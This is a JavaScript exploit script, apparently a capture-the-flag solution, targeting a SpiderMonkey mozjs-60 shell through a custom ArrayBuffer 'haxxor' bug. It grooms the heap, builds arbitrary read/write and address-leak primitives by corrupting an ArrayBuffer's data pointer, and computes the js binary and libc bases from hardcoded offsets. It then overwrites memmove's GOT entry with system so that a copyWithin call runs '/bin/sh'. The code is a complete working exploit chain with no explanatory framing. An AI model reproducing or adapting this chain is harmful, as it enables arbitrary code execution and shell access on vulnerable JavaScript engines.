const WORD_SIZE = 8;

// first add an ArrayBuffer we haxxor
const haxxored = new ArrayBuffer(96);
// put a canary here to search for in gdb
new Uint32Array(haxxored)[0] = 0x41414141;

const abs = [];
// hopefully one of these land after our haxxored ArrayBuffer
for(var i = 0; i < 3; i++) {
    // ArrayBuffers with inline buffer backing store
    const x = new ArrayBuffer(96);
    new Uint32Array(x)[0] = 0x13371337;
    abs.push(x);
}

function do_gc() {
    const MB = 0x100000;
    const maxMallocBytes = 128 * MB;
    var hoho = []
    for (var i = 0; i < 3; i++) {
        hoho.push(new ArrayBuffer(maxMallocBytes));
    }
}

// gc to move all buffers to "old space"
do_gc();
do_gc();
do_gc();

haxxored.haxxor();
const view = new DataView(haxxored);

function hex(val) {
    return ('0'.repeat(8) + val.toString(16)).substr(-8);
}
function hexAddr(val) {
    return '0x' + ('0'.repeat(16) + val.toString(16)).substr(-16);
}


const M = 0x100000000;
function ReadU64(view, offset) {
    return view.getUint32(offset + 4, true) * M + view.getUint32(offset, true);
}
function Untag(bytes) {
    bytes[6] = 0;
    bytes[7] = 0;
    return bytes;
}
function ToUint64(bytes) {
    var x = new Uint32Array(bytes.buffer);
    return x[1] * M + x[0];
}
function ReadBytes(view, offset, n) {
    var x = new Uint8Array(n);
    for(var i = 0; i < n; i++) {
        x[i] = view.readUint8(offset + i);
    }
    return x;
}
function WriteU64(view, offset, value) {
    view.setUint32(offset + 4, value / M, true);
    view.setUint32(offset, value % M, true);
}
function ShiftPtr(raw) {
    const high = raw / M;
    const low = raw % M;
    const carry = high & 1 ? 0x80000000 : 0;
    return (((high >> 1) >>> 0) * M) + (((low >> 1) | carry) >>> 0);
}
function UnshiftPtr(x) {
    const low = ((x % M) << 1) >>> 0;
    const carry = low < (x % M) ? 1 : 0;
    const high = (((x / M) << 1) >>> 0) | carry;
    return high * M + low;
}
function RW(arrBuf, offObject, targetView) {
    /*

    arrBuf: ArrayBuffer object where we can write to fields etc
    offObject: Offset from base of targetView to start of arrBuf
    targetView: DataView that overlaps with arrBuf

    NB! Tagged pointers!

    ArrayBuffer memory layout:

    00:0000│   0x7ffff537e240 —▸ 0x7ffff537b8b0     <-- group_
    01:0008│   0x7ffff537e248 —▸ 0x7ffff53aa3d0     <-- shape_
    02:0010│   0x7ffff537e250 —▸ 0x7ffff50f9340     <-- slots_
    03:0018│   0x7ffff537e258 —▸ 0xe23188           <-- elements_   (empty)
    04:0020│   0x7ffff537e260 ◂— 0x3ffffa9bf140     <-- dataPtr (rshifted)
    05:0028│   0x7ffff537e268 ◂— 0xfff8800000000060 <-- size
    06:0030│   0x7ffff537e270 ◂— 0xfffe7ffff7e00440
    07:0038│   0x7ffff537e278 ◂— 0xfff8800000000000
    08:0040│   0x7ffff537e280 ◂— 0x13381338         <-- buffer
    09:0048│   0x7ffff537e288 ◂— 0x0

    slots_:

    00:0000│   0x7ffff50f9340 ◂— 0xfff8800043434343
    01:0008│   0x7ffff50f9348 ◂— 0xe5e5e5e5e5e5e5e5

    */
    this.target = arrBuf;
    // this.targetView = new DataView(arrBuf);
    this.offSlots = offObject + 2*WORD_SIZE;
    this.offDataPtr = offObject + 4*WORD_SIZE;
    this.offSize = offObject + 5*WORD_SIZE;
    this.view = targetView;
    // stored in slots_[0]
    this.target.a = 0x43434343;

    // read some current field values
    this.slotsBufAddr = ReadU64(this.view, this.offSlots);
    this.defaultDataPtr = UnshiftPtr(ReadU64(this.view, this.offDataPtr));
    this.arrBufAddr = this.defaultDataPtr - 8*WORD_SIZE;

    // set size to max_int32 (signed)
    this.view.setUint32(this.offSize, 0x7fffffff, true);
}
RW.prototype.setDataPtr = function(addr) {
    // dataPointer is stored rshifted by 1
    var shiftAddr = ShiftPtr(addr);
    // print("       Addr: " + hexAddr(addr));
    // print("shiftedAddr: " + hexAddr(shiftAddr));
    WriteU64(this.view, this.offDataPtr, shiftAddr);
};
RW.prototype.readUint64 = function(addr) {
    /*
    Since DataView stores the backing buffer addr internally at construction time
    we have to create new views whenever we change the buffer address 
    */
    this.setDataPtr(addr);
    var x = ReadU64(new DataView(this.target), 0);
    this.setDataPtr(this.defaultDataPtr);
    return x;
};
RW.prototype.writeUint64 = function(addr, value) {
    /*
    Since DataView stores the backing buffer addr internally at construction time
    we have to create new views whenever we change the buffer address 
    */
    this.setDataPtr(addr);
    var x = WriteU64(new DataView(this.target), 0, value);
    this.setDataPtr(this.defaultDataPtr);
    return x;
};
RW.prototype.readObjAddr = function(obj) {
    this.target.a = obj;
    this.setDataPtr(this.slotsBufAddr);
    var x = new Uint8Array(this.target, 0, 8).slice();
    this.setDataPtr(this.defaultDataPtr);
    this.target.a = 0x43434343;
    return ToUint64(Untag(x));
};


let rw = undefined;

for(var i = 0; i < 0x1338; i += 4) {
    const x = view.getUint32(i, true);
    // look for canaries
    if(x == 0x13371337) {
        print("ArrayBuffer: " + hex(i) + ": " + hex(x));

        // mark arraybuffer
        view.setUint32(i, 0x13381338, true);

        let target = undefined;
        // find our marked arraybuffer
        for(var j = 0; j < abs.length; j++) {
            if(new Uint32Array(abs[j])[0] == 0x13381338) {
                target = abs[j];
                break;
            }
        }
        if(target === undefined) {
            print("Failed to find ArrayBuffer");
            throw 1;
        }

        rw = new RW(target, i - 8*WORD_SIZE, view);
        break;
    }
}

if(rw === undefined) {
    print("Failed to create RW prim");
    throw 2;
}

print("&arrBuf: " + hexAddr(rw.arrBufAddr));
print("slots_: " + hexAddr(rw.slotsBufAddr));
print("dataPtr: " + hexAddr(rw.defaultDataPtr));

// print('Date.now: ' + hexAddr(rw.readObjAddr(Date.now)));
const nativeFuncObj = rw.readObjAddr(Date.now);
print("Date.now: " + hexAddr(nativeFuncObj));

const nativeFuncAddr = rw.readUint64(nativeFuncObj + 5*WORD_SIZE);
print("native func: " + hexAddr(nativeFuncAddr));

/* 
js: sha1sum
88ca9f00db9e0d26d1e0affeffca5281fdc973ec  mozjs-60.0.3/js/src/build_OPT.OBJ/dist/bin/js
*/
const js_base = nativeFuncAddr - 0x4138f0;
const got_base = js_base + 0xcdb000;
print("got base: " + hexAddr(got_base));

strlen_got = got_base + 0x38
memmove_got = got_base + 0x328

/* 
Prepare payload for this technique:
https://github.com/saelo/feuerfuchs/blob/master/exploit/pwn.js#L355
*/
const cmd_payload = new Uint8Array(100);
const cmd = "/bin/sh\x00";
for(var i = 0; i < cmd.length; i++) {
    cmd_payload[i] = cmd.charCodeAt(i);
}

/*
libc: 2.23-0ubuntu10
56d992a0342a67a887b8dcaae381d2cc51205253  /lib/x86_64-linux-gnu/libc.so.6
*/
strlen_to_libc_base = 0x8b720
system_to_libc_base = 0x45390

const strlen = rw.readUint64(strlen_got);
print('strlen: ' + hexAddr(strlen));
const libcBase = strlen - strlen_to_libc_base;
const system = libcBase + system_to_libc_base;
print('system: ' + hexAddr(system));

rw.writeUint64(memmove_got, system);
cmd_payload.copyWithin(0, 1);
